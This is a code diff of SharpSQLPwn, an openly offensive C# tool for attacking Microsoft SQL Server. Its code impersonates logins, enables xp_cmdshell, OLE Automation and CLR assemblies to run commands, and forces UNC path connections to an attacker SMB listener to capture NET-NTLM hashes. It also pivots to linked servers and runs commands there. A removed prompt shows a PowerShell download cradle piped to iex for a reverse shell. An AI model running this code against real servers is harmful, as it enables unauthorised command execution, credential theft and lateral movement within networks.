@@ -1,11 +1,100 @@
 ﻿using System;
 using System.Data.SqlClient;
+using CommandLine;
 
 namespace SharpSQLPwn
 {
     class Program
     {
-        static Exception QuerySQL(SqlConnection con, String query, bool output)
+        class Options
+        {
+            [Option('t', "SQLServer", Default = "LocalMachine",
+              HelpText = "Target SQL Server Hostname or IP.")]
+            public string SQLServer { get; set; }
+
+            [Option('d', "Database", Default = "master",
+              HelpText = "Database Name of target SQL server.")]
+            public string Database { get; set; }
+
+            [Option('M', "Modules", Default = "R",
+             HelpText = "Available Modules: R=Recon, I=Impersonation, C=CommandExecution, U=UNCPathInjection, L=LinkedSQL")]
+            public string Modules { get; set; }
+
+            [Option('U', "ImpersonatedUser", Default = "sa",
+              HelpText = "Name of user to impersonate.")]
+            public string ImpersonatedUser { get; set; }
+
+            [Option('C', "CmdExecTechnique", Default = 1,
+              HelpText = "Available Command Execution Techniques: 1=xp_cmdshell, 2=sp_OACreate, 3=dll_assembly")]
+            public int CmdExecTechnique { get; set; }
+
+            [Option('x', "CmdExecCommand", Default = "",
+             HelpText = "Command to be executed.")]
+            public string CmdExecCommand { get; set; }
+
+            [Option('I', "AttackerIP", Default = "",
+              HelpText = "Local IP of the attacker (used for responder or ntlmrelay or Inveigh).")]
+            public string AttackerIP { get; set; }
+
+            [Option('L', "LinkedSQLServer",
+             HelpText = "Target linked SQL Server Hostname or IP.")]
+            public string LinkedSQLServer { get; set; }
+
+            [Option('i', "Interactive",
+             HelpText = "Run Interactive version.")]
+            public bool Interactive { get; set; }
+
+            [Option('E', "Example",
+             HelpText = "Display example commands.")]
+            public bool Example { get; set; }
+        }
+
+        static void ShowBanner(bool exmpl)
+        {
+            Console.WriteLine();
+                   Console.WriteLine(@"   _____ __                    _____ ____    __    ____     ");
+                   Console.WriteLine(@"  / ___// /_  ____ __________ / ___// __ \  / /   / __ \_      ______ ");
+                   Console.WriteLine(@"  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ / / / / /   / /_/ / | /| / / __ \");
+                   Console.WriteLine(@" ___/ / / / / /_/ / /  / /_/ /__/ / /_/ / / /___/ ____/| |/ |/ / / / /");
+                   Console.WriteLine(@"/____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/ ");
+                   Console.WriteLine(@"                     /_/                                              ");
+                   Console.WriteLine(@"   https://github.com/lefayjey/SharpSQLPwn");
+                   Console.WriteLine(@"   Version:  1.0");
+                   Console.WriteLine(@"   Author:  lefayjey");
+                   Console.WriteLine();
+                   Console.ResetColor();
+
+                   if (exmpl)
+                   {
+                       Console.WriteLine($"Example usage (Interactive version):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe -i");
+                       Console.WriteLine();
+                       Console.WriteLine($"Example usage (Test connection to local machine):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe");
+                       Console.WriteLine();
+                       Console.WriteLine($"Example usage (Basic recon):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe -t SQLServer [-d DatabaseName]");
+                       Console.WriteLine();
+                       Console.WriteLine($"Example usage (Impersonation):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe -M I -t SQLServer [-d DatabaseName] -U ImpersonatedUser");
+                       Console.WriteLine(); 
+                       Console.WriteLine($"Example usage (Command Execution):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe -M C[I] -t SQLServer [-d DatabaseName] -C CmdExecTechnique -x Command [-U ImpersonatedUser]");
+                       Console.WriteLine(); 
+                       Console.WriteLine($"Example usage (UNC Path Injection):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe -M U[I] -t SQLServer [-d DatabaseName] -I AttackerIP [-U ImpersonatedUser]");
+                       Console.WriteLine(); 
+                       Console.WriteLine($"Example usage (Linked Servers):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe -M L -t SQLServer [-d DatabaseName] -L LinkedSQLServer -x Command");
+                       Console.WriteLine(); 
+                       Console.WriteLine($"Example usage (All modules):");
+                       Console.WriteLine($".\\SharpSQLPwn.exe -M RICUL -t SQLServer [-d DatabaseName] -U ImpersonatedUser -C CmdExecTechnique -x Command -I AttackerIP -L LinkedSQLServer");
+                       Console.WriteLine(); 
+
+                       Environment.Exit(0);
+                   }
+        }
+    static Exception QuerySQL(SqlConnection con, String query, bool output)
         {
             try
             {
@@ -16,7 +105,7 @@ namespace SharpSQLPwn
                     while (reader.Read() == true)
                     {
                         Console.ForegroundColor = ConsoleColor.Cyan;
-                        Console.WriteLine("---> " + reader[0]);
+                        if (reader[0] != DBNull.Value) { Console.WriteLine("---> " + reader[0]); };
                         Console.ResetColor();
                     }
                 }
@@ -32,35 +121,6 @@ namespace SharpSQLPwn
                 return e;
             }
 
-        }
-
-        static Exception ChangeUserContext(SqlConnection con)
-        {
-            try
-            {
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("[+] Currently logged in as: ");
-                Console.ResetColor();
-                QuerySQL(con, "SELECT SYSTEM_USER;", true);
-
-                Console.Write("[Q] Would you like to impersonate another user? [y/N]: ");
-                String question_user = Console.ReadLine();
-                if (question_user == "y" || question_user == "Y" || question_user == "YES" || question_user == "yes")
-                {
-                    Console.Write("[Q] Please enter the name of login to impersonate: ");
-                    String implogin = Console.ReadLine();
-                    String impersonateUser = "EXECUTE AS LOGIN = '" + implogin + "';";
-                    QuerySQL(con, impersonateUser, false);
-                }
-                return null;
-            }
-            catch (Exception e)
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[-] Failed to Impersonate Message: " + e.Message);
-                Console.ResetColor();
-                return e;
-            }
         }
 
         static Exception CheckRole(SqlConnection con, String rolename)
@@ -99,15 +159,9 @@ namespace SharpSQLPwn
 
         }
 
-        static string EncodePsShellcode()
+        static string EncodePsShellcode(String PS_cradle)
         {
-
-            Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.WriteLine("\n[NOTE] Please enter PS download cradle with EXACT single & double quotes format --> \"(New-Object System.Net.Webclient).DownloadString('http://XXX.YYY.XXX.ZZZ/Reflection.txt') | iex\"");
-            Console.ResetColor();
-            Console.Write("[Q] Enter PS code here: ");
-            String shellcode = Console.ReadLine();
-            String code = shellcode.Replace("\"", "");
+            String code = PS_cradle.Replace("\"", "");
 
             var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(code);
             var psCommandBase64 = Convert.ToBase64String(psCommandBytes);
@@ -123,38 +177,9 @@ namespace SharpSQLPwn
             return shellcodecmd;
         }
 
-        static void Main(string[] args)
+        static void Recon(SqlConnection con)
         {
-            Console.Write("\n[Q] Please enter SQL Server domain name (Press [Enter] to use local instance): ");
-            String input = Console.ReadLine();
-            String sqlServer;
-            if (string.IsNullOrEmpty(input)) { sqlServer = System.Environment.MachineName; }
-            else { sqlServer = input; }
-
-            Console.Write("[Q] Please enter database name (Press [Enter] to use master): ");
-            input = Console.ReadLine();
-            String database;
-            if (string.IsNullOrEmpty(input)) { database = "master"; }
-            else { database = input; }
-
-            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
-            SqlConnection con = new SqlConnection(conString);
-
-            try
-            {
-                con.Open();
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("\n[+] Authentication Success!");
-                Console.ResetColor();
-            }
-            catch
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\n[-] Authentication Failed");
-                Console.ResetColor();
-                Environment.Exit(0);
-            }
-
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Recon Tests <<<<<<<<<<<<<<<<<<<");
             //System username of current session
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("\n[+] Logged in as:");
@@ -163,7 +188,7 @@ namespace SharpSQLPwn
 
             //Mapped SQL username
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("\n[+] Mapped to User:");
+            Console.WriteLine("[+] Mapped to User:");
             Console.ResetColor();
             QuerySQL(con, "SELECT USER_NAME();", true);
 
@@ -184,118 +209,92 @@ namespace SharpSQLPwn
             QuerySQL(con, allusers_query, true);
 
             Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("\n[*] Testing impersonation...");
+            Console.WriteLine("\n[*] Checking linked SQL servers ...");
+            Console.ForegroundColor = ConsoleColor.Green;
+            String linkedquery = "EXEC sp_linkedservers;";
+            Console.WriteLine("[+] Linked SQL Servers:");
             Console.ResetColor();
-            ChangeUserContext(con);
+            QuerySQL(con, linkedquery, true);
+        }
 
-            Console.Write("\n[Q] Would you like to try get NET-NTLM Hash? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
-            String question = Console.ReadLine();
-            if (question == "y" || question == "Y" || question == "YES" || question == "yes")
+        static void Impersonate(SqlConnection con, String impers_user)
+        {
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Impersonation Tests <<<<<<<<<<<<<<<<<<<");
+            if (impers_user != "")
             {
-
-                Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
-                String smb_ip = Console.ReadLine();
-
                 Console.ForegroundColor = ConsoleColor.Blue;
-                Console.WriteLine("[*] Trying to connect SMB share on " + smb_ip + " ...");
-                Console.ResetColor();
-                String smbquery = "EXEC master..xp_dirtree \"\\\\" + smb_ip + "\\test\";";
-                QuerySQL(con, smbquery, false);
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("[+] Please check Responder/Impacket interface on Kali");
+                Console.WriteLine("[*] Testing impersonation...");
                 Console.ResetColor();
 
-            }
-            else
-            {
-            }
-
-            Console.Write("\n[Q] Would you like to try Command Execution on " + sqlServer + "? [y/N]: ");
-            String question2 = Console.ReadLine();
-            if (question2 == "y" || question2 == "Y" || question2 == "YES" || question2 == "yes")
-            {
-                Console.Write("[Q] Which technique would you like to use?");
-                Console.Write("\n[Q] Enter 1 for xp_cmdshell, 2 for Ole Automation Procedures, 3 for DLL assembly: ");
-                String technique = Console.ReadLine();
-
-                if (technique == "1")
+                try
                 {
-                    String cmd;
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("[+] Currently logged in as: ");
+                    Console.ResetColor();
+                    QuerySQL(con, "SELECT SYSTEM_USER;", true);
 
-                    Console.Write("\n[Q] Would you like to execute a PS cradle to obtain a reverse shell? [y/N]: ");
-                    String question_psshellcode = Console.ReadLine();
-                    if (question_psshellcode == "y" || question_psshellcode == "Y" || question_psshellcode == "YES" || question_psshellcode == "yes")
-                    {
-                        cmd = EncodePsShellcode();
-                    }
-                    else
-                    {
-                        Console.Write("[Q] Please enter command to execute: ");
-                        cmd = Console.ReadLine();
-                    }
+                    String implogin = impers_user;
+                    String impersonateUser = "EXECUTE AS LOGIN = '" + implogin + "';";
+                    QuerySQL(con, impersonateUser, false);
+                }
+                catch (Exception e)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("[-] Failed to Impersonate Message: " + e.Message);
+                    Console.ResetColor();
+                }
+            }
+        }
+
+        static void CmdExec(SqlConnection con, int cmdExec_tech, string cmdExec_command)
+        {
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Command Execution Tests <<<<<<<<<<<<<<<<<<<");
+            if (cmdExec_command != "")
+            {
+                Console.ForegroundColor = ConsoleColor.Blue;
+                Console.Write("[*] Trying to execute commands using chosen technique: 1 for xp_cmdshell, 2 for Ole Automation Procedures, 3 for DLL assembly: ");
+                Console.ResetColor();
+
+                if (cmdExec_tech == 1)
+                {
+                    String cmd = EncodePsShellcode(cmdExec_command);
 
                     Console.ForegroundColor = ConsoleColor.Blue;
-                    Console.WriteLine("\n[*] Trying technique-1 by enabling xp_cmdshell procedure if disabled ...");
+                    Console.WriteLine("[*] Trying technique-1 by enabling xp_cmdshell procedure if disabled ...");
                     Console.ResetColor();
                     String enable_xpcmdshell = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                     QuerySQL(con, enable_xpcmdshell, false);
 
                     String execcmd = "EXEC xp_cmdshell '" + cmd + "';";
                     Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("\n[+] Command output (if any):");
+                    Console.WriteLine("[+] Command output (if any):");
                     Console.ResetColor();
 
                     QuerySQL(con, execcmd, true);
                 }
 
-                if (technique == "2")
+                if (cmdExec_tech == 2)
                 {
-                    String cmd;
-
-                    Console.Write("\n[Q] Would you like to execute a PS cradle to obtain a reverse shell? [y/N]: ");
-                    String question_psshellcode = Console.ReadLine();
-
-                    if (question_psshellcode == "y" || question_psshellcode == "Y" || question_psshellcode == "YES" || question_psshellcode == "yes")
-                    {
-                        cmd = EncodePsShellcode();
-
-                    }
-                    else
-                    {
-                        Console.Write("[Q] Please enter command to execute: ");
-                        cmd = Console.ReadLine();
-                    }
+                    String cmd = EncodePsShellcode(cmdExec_command);
 
                     Console.ForegroundColor = ConsoleColor.Blue;
-                    Console.WriteLine("\n[*] Trying technique-2 by enabling sp_OACreate procedure if disabled ...");
+                    Console.WriteLine("[*] Trying technique-2 by enabling sp_OACreate procedure if disabled ...");
                     Console.ResetColor();
                     String enable_sp_oacreate = "EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                     QuerySQL(con, enable_sp_oacreate, false);
                     String execcmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '" + cmd + "';";
                     Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("\n[+] Command output (if any):");
+                    Console.WriteLine("[+] Command output (if any):");
                     Console.ResetColor();
                     QuerySQL(con, execcmd, true);
                 }
 
-                if (technique == "3")
+                if (cmdExec_tech == 3)
                 {
-                    String cmd;
-
-                    Console.Write("\n[Q] Would you like to execute a PS cradle to obtain a reverse shell? [y/N]: ");
-                    String question_psshellcode = Console.ReadLine();
-                    if (question_psshellcode == "y" || question_psshellcode == "Y" || question_psshellcode == "YES" || question_psshellcode == "yes")
-                    {
-                        cmd = EncodePsShellcode();
-                    }
-                    else
-                    {
-                        Console.Write("[Q] Please enter command to execute: ");
-                        cmd = Console.ReadLine();
-                    }
+                    String cmd = EncodePsShellcode(cmdExec_command);
 
                     Console.ForegroundColor = ConsoleColor.Blue;
-                    Console.WriteLine("\n[*] Trying technique-3 by creating dll assembly and a custom procedure ...");
+                    Console.WriteLine("[*] Trying technique-3 by creating dll assembly and a custom procedure ...");
                     Console.ResetColor();
                     String enable_clr = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE";
                     QuerySQL(con, enable_clr, false);
@@ -308,7 +307,7 @@ namespace SharpSQLPwn
 
                     String execcmd = "EXEC sqlcmdExec '" + cmd + "';";
                     Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("\n[+] Command output (if any):");
+                    Console.WriteLine("[+] Command output (if any):");
                     Console.ResetColor();
                     QuerySQL(con, execcmd, true);
 
@@ -318,148 +317,231 @@ namespace SharpSQLPwn
                     QuerySQL(con, drop_assembly, false);
 
                 }
-
             }
-            else
-            {
-            }
+        }
 
-            Console.Write("\n[Q] Would you like to check for linked SQL servers (This can be even done with unprivileged user/login)? [y/N]: ");
-            String question3 = Console.ReadLine();
-            if (question3 == "y" || question3 == "Y" || question3 == "YES" || question3 == "yes")
+        static void UNCPathInjection(SqlConnection con, string smb_ip)
+        {
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running UNC Path Injection Tests <<<<<<<<<<<<<<<<<<<");
+            if (smb_ip != "")
             {
-                Console.ForegroundColor = ConsoleColor.Green;
-                String linkedquery = "EXEC sp_linkedservers;";
-                Console.WriteLine("\n[+] Linked SQL Servers:");
-                Console.ResetColor();
-                QuerySQL(con, linkedquery, true);
-            }
-            else
-            {
-            }
-
-
-            Console.Write("\n[Q] Would you like to check access on linked SQL servers (if mentioned above)? [y/N]: ");
-            String question4 = Console.ReadLine();
-            if (question4 == "y" || question4 == "Y" || question4 == "YES" || question4 == "yes")
-            {
-                Console.Write("[Q] Please enter linked SQL server name: ");
-                String linkedsqlserver = Console.ReadLine();
-
                 Console.ForegroundColor = ConsoleColor.Blue;
-                Console.WriteLine("[*] Checking access on: " + linkedsqlserver);
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("[+] On " + linkedsqlserver + ", executing as:");
-                Console.ResetColor();
-
-                String execLinkedServer = "select myuser from openquery(\"" + linkedsqlserver + "\", 'select SYSTEM_USER as myuser');";
-                Exception e = QuerySQL(con, execLinkedServer, true);
-                if (e != null)
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("[-] Cannot make connection to remote SQL server. RPC out could be disabled. Message: " + e.Message);
-                    Console.ResetColor();
-
-                    Console.Write("\n[Q] Would you like to enable RPC out? [y/N]: ");
-                    String question_rpc = Console.ReadLine();
-                    if (question_rpc == "y" || question_rpc == "Y" || question_rpc == "YES" || question_rpc == "yes")
-                    {
-                        Console.Write("\n[Q] Please enter remote SQL server name: ");
-                        String server = Console.ReadLine();
-
-                        Console.ForegroundColor = ConsoleColor.Blue;
-                        Console.WriteLine("[*] Trying to enable RPC out using sp_serveroptions");
-                        Console.ResetColor();
-                        String serveroption = "EXEC sp_serveroption '" + linkedsqlserver + "', 'rpc', 'true'; EXEC sp_serveroption '" + linkedsqlserver + "', 'rpc out', 'true';";
-                        QuerySQL(con, serveroption, true);
-                        e = QuerySQL(con, execLinkedServer, true);
-                        if (e == null)
-                        {
-                            Console.ForegroundColor = ConsoleColor.Green;
-                            Console.WriteLine("[+] Done! RPC out enabled for remote SQL server");
-                            Console.ResetColor();
-                        }
-                    }
-                    else
-                    {
-                    }
-
-                }
-            }
-            else
-            {
-            }
-
-            Console.Write("\n[Q] Would you like to try get NET-NTLM Hash of remote SQL server? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
-            String question5 = Console.ReadLine();
-            if (question5 == "y" || question5 == "Y" || question5 == "YES" || question5 == "yes")
-            {
-                Console.Write("[Q] Please enter remote SQL server name: ");
-                String server = Console.ReadLine();
-
-                Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
-                String smb_ip = Console.ReadLine();
-
-                Console.ForegroundColor = ConsoleColor.Blue;
+                Console.WriteLine("[*] Trying get NET-NTLM Hash [NOTE: Ensure Responder/Impacket is listening]");
                 Console.WriteLine("[*] Trying to connect SMB share on " + smb_ip + " ...");
                 Console.ResetColor();
-                String smbquery = "EXEC ('master..xp_dirtree ''\"\\\\" + smb_ip + "\\test\"'';') AT [" + server + "]";
+                String smbquery = "EXEC master..xp_dirtree \"\\\\" + smb_ip + "\\test\";";
+                QuerySQL(con, smbquery, false);
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("[+] Please check Responder/Impacket interface on Kali");
+                Console.ResetColor();
+            }
+        }
+
+        static void TestLinkedServer(SqlConnection con, string linkedSQLServer, string smb_ip, string cmdExeclinked)
+        {
+            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Linked Servers Tests <<<<<<<<<<<<<<<<<<<");
+            Console.ForegroundColor = ConsoleColor.Blue;
+            Console.WriteLine("[*] Checking access on: " + linkedSQLServer);
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("[+] On " + linkedSQLServer + ", executing as:");
+            Console.ResetColor();
+
+            String execLinkedServer = "select myuser from openquery(\"" + linkedSQLServer + "\", 'select SYSTEM_USER as myuser');";
+            Exception e = QuerySQL(con, execLinkedServer, true);
+            if (e != null)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[-] Cannot make connection to remote SQL server. RPC out could be disabled. Message: " + e.Message);
+                Console.ResetColor();
+
+                Console.WriteLine("[*] Trying to enable RPC out using sp_serveroptions");
+                Console.ResetColor();
+                String serveroption = "EXEC sp_serveroption '" + linkedSQLServer + "', 'rpc', 'true'; EXEC sp_serveroption '" + linkedSQLServer + "', 'rpc out', 'true';";
+                QuerySQL(con, serveroption, true);
+                Exception e2 = QuerySQL(con, execLinkedServer, true);
+                if (e2 == null)
+                {
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("[+] Done! RPC out enabled for remote SQL server");
+                    Console.ResetColor();
+                }
+
+            }
+
+            if (smb_ip != "")
+            {
+                Console.ForegroundColor = ConsoleColor.Blue;
+                Console.WriteLine("[*] Trying to connect SMB share on " + smb_ip + " on remote SQL Server " + linkedSQLServer + " ...");
+                Console.ResetColor();
+                String smbquery = "EXEC ('master..xp_dirtree ''\"\\\\" + smb_ip + "\\test\"'';') AT [" + linkedSQLServer + "]";
 
                 QuerySQL(con, smbquery, false);
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("[+] Please check Responder/Impacket interface on Kali");
                 Console.ResetColor();
             }
-            else
+
+            if (cmdExeclinked != "")
             {
-            }
+                String cmd = EncodePsShellcode(cmdExeclinked);
 
-            Console.Write("\n[Q] Would you like to enable xp_cmdshell and execute command on remote SQL server? [y/N]: ");
-            String question6 = Console.ReadLine();
-            if (question6 == "y" || question6 == "Y" || question6 == "YES" || question6 == "yes")
-            {
-                Console.Write("[Q] Please enter remote SQL server name: ");
-                String server = Console.ReadLine();
-
-                String cmd;
-                Console.Write("\n[Q] Would you like to execute a PS cradle to obtain a reverse shell? [y/N]: ");
-                String question_psshellcode = Console.ReadLine();
-                if (question_psshellcode == "y" || question_psshellcode == "Y" || question_psshellcode == "YES" || question_psshellcode == "yes")
-                {
-                    cmd = EncodePsShellcode();
-                }
-                else
-                {
-                    Console.Write("[Q] Please enter command to execute on " + server + ": ");
-                    cmd = Console.ReadLine();
-                }
-
-                Console.ForegroundColor = ConsoleColor.Blue;
-                Console.WriteLine("[*] Enabling xp_cmdshell options");
-                Console.ResetColor();
-                string enableoption = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + server + "]";
+                string enableoption = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + linkedSQLServer + "]";
                 QuerySQL(con, enableoption, false);
-                Console.ForegroundColor = ConsoleColor.Blue;
-                Console.WriteLine("[*] Enabling xp_cmdshell procedure");
-                Console.ResetColor();
-                string enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [" + server + "]";
+                string enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [" + linkedSQLServer + "]";
                 QuerySQL(con, enablexpcmdshell, false);
 
-                String execcmd = "EXEC ('xp_cmdshell ''" + cmd + "'';') AT [" + server + "]";
+                String execcmd = "EXEC ('xp_cmdshell ''" + cmd + "'';') AT [" + linkedSQLServer + "]";
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("\n[+] Command output on " + server + " (if any): ");
+                Console.WriteLine("\n[+] Command output on " + linkedSQLServer + " (if any): ");
                 Console.ResetColor();
                 QuerySQL(con, execcmd, true);
-
             }
-            else
-            {
-            }
-
-            con.Close();
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("[+] Done! Exiting ... ");
-            Console.ResetColor();
         }
+
+        static void Main(string[] args)
+        {
+            Parser.Default.ParseArguments<Options>(args)
+               .WithParsed<Options>(o =>
+               {
+                   ShowBanner(o.Example);
+
+                   if (o.Interactive) { 
+                        Console.Write("\n[Q] Please enter SQL Server domain name (Press [Enter] to use local instance): ");
+                        String input = Console.ReadLine();
+                        String sqlServ;
+                        if (string.IsNullOrEmpty(input)) { sqlServ = System.Environment.MachineName; }
+                        else { sqlServ = input; }
+
+                        Console.Write("[Q] Please enter database name (Press [Enter] to use master): ");
+                        input = Console.ReadLine();
+                        String db;
+                        if (string.IsNullOrEmpty(input)) { db = "master"; }
+                        else { db = input; }
+
+                        String coniString = "Server = " + sqlServ + "; Database = " + db + "; Integrated Security = True;";
+                        SqlConnection coni = new SqlConnection(coniString);
+
+                        try
+                        {
+                            coni.Open();
+                            Console.ForegroundColor = ConsoleColor.Green;
+                            Console.WriteLine("\n[+] Authentication Success!");
+                            Console.ResetColor();
+                        }
+                        catch
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("\n[-] Authentication Failed");
+                            Console.ResetColor();
+                            Environment.Exit(0);
+                        }
+
+                        Recon(coni);
+
+                        Console.Write("[Q] Would you like to impersonate another user? [y/N]: ");
+                        String question_user = Console.ReadLine();
+                        if (question_user == "y" || question_user == "Y" || question_user == "YES" || question_user == "yes")
+                        {
+                            Console.Write("[Q] Please enter the name of login to impersonate: ");
+                            String implogin = Console.ReadLine();
+                            Impersonate(coni, implogin);
+                        }
+
+                        Console.Write("\n[Q] Would you like to try get NET-NTLM Hash? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
+                        String question = Console.ReadLine();
+                        if (question == "y" || question == "Y" || question == "YES" || question == "yes")
+                        {
+                            Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
+                            String smb_ip = Console.ReadLine();
+
+                            UNCPathInjection(coni, smb_ip);
+                            Console.ForegroundColor = ConsoleColor.Blue;
+                        }
+
+                        Console.Write("\n[Q] Would you like to try Command Execution on " + sqlServ + "? [y/N]: ");
+                        String question2 = Console.ReadLine();
+                        if (question2 == "y" || question2 == "Y" || question2 == "YES" || question2 == "yes")
+                        {
+                            Console.Write("[Q] Which technique would you like to use?");
+                            Console.Write("\n[Q] Enter 1 for xp_cmdshell, 2 for Ole Automation Procedures, 3 for DLL assembly: ");
+                            int technique = Int32.Parse(Console.ReadLine());
+                            String cmd;
+                            Console.Write("[Q] Please enter command to execute: ");
+                            cmd = Console.ReadLine();
+                            CmdExec(coni, technique, cmd);
+                        }
+
+                        Console.Write("\n[Q] Would you like to check access on linked SQL servers (if mentioned above)? [y/N]: ");
+                        String question3 = Console.ReadLine();
+                        if (question3 == "y" || question3 == "Y" || question3 == "YES" || question3 == "yes")
+                        {
+                            Console.Write("[Q] Please enter linked SQL server name: ");
+                            String linkedsqlserver = Console.ReadLine();
+                            TestLinkedServer(coni, linkedsqlserver, "", "");
+                            
+                            Console.Write("\n[Q] Would you like to try get NET-NTLM Hash of remote SQL server? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
+                            String question4 = Console.ReadLine();
+                            if (question4 == "y" || question4 == "Y" || question4 == "YES" || question4 == "yes")
+                            {
+                                Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
+                                String smb_ip = Console.ReadLine();
+                                TestLinkedServer(coni, linkedsqlserver, smb_ip, "");
+                            }
+
+                            Console.Write("\n[Q] Would you like to enable xp_cmdshell and execute command on remote SQL server? [y/N]: ");
+                            String question5 = Console.ReadLine();
+                            if (question5 == "y" || question5 == "Y" || question5 == "YES" || question5 == "yes")
+                            {
+                                Console.Write("[Q] Please enter command to execute on " + linkedsqlserver + ": ");
+                                String cmd;
+                                cmd = Console.ReadLine();
+                                TestLinkedServer(coni, linkedsqlserver, "", cmd);
+                            }
+
+                        }
+                        coni.Close();
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine("\n[+] Done! Exiting ... ");
+                        Console.ResetColor();
+                        Environment.Exit(0);
+                    }
+
+                   if (o.SQLServer == "LocalMachine") { o.SQLServer = System.Environment.MachineName; }
+
+                   String conString = "Server = " + o.SQLServer + "; Database = " + o.Database + "; Integrated Security = True;";
+                   SqlConnection con = new SqlConnection(conString);
+
+                   try
+                   {
+                       con.Open();
+                       Console.ForegroundColor = ConsoleColor.Green;
+                       Console.WriteLine("\n[+] Authentication Success!");
+                       Console.ResetColor();
+                   }
+                   catch
+                   {
+                       Console.ForegroundColor = ConsoleColor.Red;
+                       Console.WriteLine("\n[-] Authentication Failed");
+                       Console.ResetColor();
+                       con.Close();
+                       Environment.Exit(0);
+                   }
+
+
+                   if (o.Modules.Contains("R")) { Recon(con); }
+                   if (o.Modules.Contains("I")) { Impersonate(con, o.ImpersonatedUser); }
+                   if (o.Modules.Contains("C")) { CmdExec(con, o.CmdExecTechnique, o.CmdExecCommand); }
+                   if (o.Modules.Contains("U")) { UNCPathInjection(con, o.AttackerIP); }
+                   if (o.Modules.Contains("L")) { TestLinkedServer(con, o.LinkedSQLServer, o.AttackerIP, o.CmdExecCommand); }
+
+                   con.Close();
+                   Console.ForegroundColor = ConsoleColor.Green;
+                   Console.WriteLine("\n[+] Done! Exiting ... \n");
+                   Console.ResetColor();
+                   Environment.Exit(0);
+               });
+        }
+
+        
     }
 }
